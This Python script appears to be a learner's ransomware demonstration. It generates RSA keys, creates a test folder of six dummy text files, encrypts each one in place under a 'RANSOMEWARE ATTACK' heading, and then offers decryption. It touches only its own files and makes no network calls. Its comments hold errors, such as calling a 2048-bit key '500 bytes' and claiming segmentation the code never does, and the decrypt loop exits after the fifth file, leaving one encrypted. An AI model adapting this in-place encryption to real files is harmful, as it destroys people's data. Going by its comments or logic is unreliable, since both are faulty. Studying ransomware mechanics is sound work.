import os
import sys 
import queue #This is going to allow us to create the thread stacks that we need to enumerae the file system and store all the file type data

#All of this is needed in order for us to start working withthe RSA encryption algorithm
#THIS ALGORUTHM REQUIRES US TO USE METHODS THA FRAGMENT AND COMPILE FILE DATA INTO 128 SEGMENTS UNTIL ALL OF IT IS ENCRYPTED INTO CIPHER TEXT
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

######################################### KEY CREATION

#First thing we need to do is generate the crypto keys that we need to encrypt the data 
key_pairs = rsa.generate_private_key(backend=default_backend(), public_exponent=65537, key_size=2048) #This is going to be a crypto key that is 500nbytes long in size for our RSA ecryption

#Next we need ot start padding nad encoding the main private and public keys using the key pari data. We're going to start with the private key, which will be used to decrypt data
private_key = key_pairs.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())

#Next we need to start defining the main punlic key that will be used to encrypt the data
public_key_objetct = key_pairs.public_key() #This is goign to create the main object that will allow use to format a public key
public_key = public_key_objetct.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)

#Now we need to write them to files
Private_key = open('Private_Key.pem', 'wb')
Public_key = open('Public_Key.pub', 'wb') 

#Now we need to write the keys to the files 
Private_key.write(private_key)
Public_key.write(public_key)

#Next we need to close out the main files that we just opened. This is also going to allow any and all file contents we save to them to close out properlly. 
Private_key.close()
Public_key.close()

#First thing we need to do is read in the public key, and then convert it to bytes so that we can handle it later for encryption purposes 
read_public_key = open('Public_Key.pub', 'rb')
public_key_data = read_public_key.read() #This is going to read in the public key data and then encode it in binary format 

#We are using the private key to decrypt the data and remove the ransoemware on teh target files we just made for the system
read_private_key = open('Private_Key.pem', 'rb') 
private_key_data = read_private_key.read()

#Now that all the key data is loaded and is in binary format, we need to begin loading the public key and private key for usage in the code later on
load_public_key = serialization.load_pem_public_key(public_key_data, backend=default_backend()) #This is going to load the key and set the main backend for it

#Now rinse and repeate for the private key
load_private_key = serialization.load_pem_private_key(private_key_data, password=None, backend=default_backend()) #This is going to load the private key nad set the main backend for it

#Now we need to do a small little test that will see if the data can be encrypted correctly via the use of the public key 

#First we need to ask the end user to enter in osme data to conert to binary format
data_bytes = input("Testing the public key.... Enter in some data....  ").encode('utf-8') #You can alos do this by using the cast method with the key word "bytes"
encrypt_data = load_public_key.encrypt(data_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))

print(encrypt_data) #This is going to help us confirm whether or notthe data has been successfully encrypted 

clear_screen = input("Testing the private key now. Hit enter to proceed... ")

decrypt_data = load_private_key.decrypt(encrypt_data, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))

print(decrypt_data)

check = input("Hit enter in order to proceed if all actions are workign accordingly...   ")
os.system("clear")


######################################### RANSOMEWARE ATTACK

######## Creating the dummy test folder for the attack 
#Once the end user has hit enter and we manage to confirm that the crypto keys are indeed working, then we need to start executing the other section of the code

#First thing we need to do is create the test directory wher ethe exploit will begin
os.makedirs("ransometest") 

#Next we need to generate the main list that will contain the smample sof allm the fiels that are goingt o be generatesd
filenames = ["test1.txt", "test2.txt", "test3.txt", "test4.txt", "test5.txt", "test6.txt"]

#Next we need to move into the directroy for the exploit test
os.chdir("ransometest")

#Next we desig the main forloop logic that will iterate the main list/array elements in which a file will be created for them
for f in filenames:

    #Now we create a file for each element name that we itterate through
    create_file = open(f, 'w') 
    create_file.write(f)
    create_file.close() 


######## Enumerating and encrypting all the data from the files and such

#Next the program is going to start enumeating the file system again in the directory we are targeting in order to encrypt all the data and
for w in filenames:

    #The data is going to be read, and then it's going to be encrypted one at a time 
    read_files = open(w, 'r')
    target = read_files.read().encode('utf-8') #This is goign to encode it in binary format WHICH IS REQUEIRED in ordeered to encrypt all the data successfully 
    
    #Next the encryption process takes place on each and every fiel thtat we are interacting with
    ransome = load_public_key.encrypt(target, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))

    #Next we are going to mimic the code above form the first for loop and have it encrypt all the dat in them by overwritting the current fles in the directory 
    ransome_files = open(w, 'wb')
    ransome_files.write(ransome)
    ransome_files.close()



while True:
    
    option = input("Would you like to decrypt all the files for the experiemnet (enter -> y)")
    if option == "y":

        #A for lool is going to run that will read in the binary files encrypted and then decrypt them on the system 
        for d in filenames:

            file_data = open(d, 'rb')
            data2 = file_data.read() 

            ransome_free = load_private_key.decrypt(data2, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
            ransome_data = ransome_free.decode('utf-8')
            #print(ransome_data)

            #input("")
            #Next we ened to rinse and repeat the same rpocess when writing the binary encrypted data to a file in order to overwrite it again  
            ransome_free = open(d, 'w')
            ransome_free.write(ransome_data)
            ransome_free.close()

            print("ALL THE DATA HAS BEEN DECRYPTED")

            #Each time the loop iterates, we are going to check the value of d and set it to break once the program has raeched the final section of the for loop
            if d == filenames[4]: 

                #If the final element of d is equal to the last elemnt in the list of the fielenames I want the rpogram to print it's a given match 
                exit()
            #THis will manually close out the porgram on our end via the exti() functionc

    else:

        print("PLEASE ENTER IN THE CORRECT OPTION TO PROCEED")


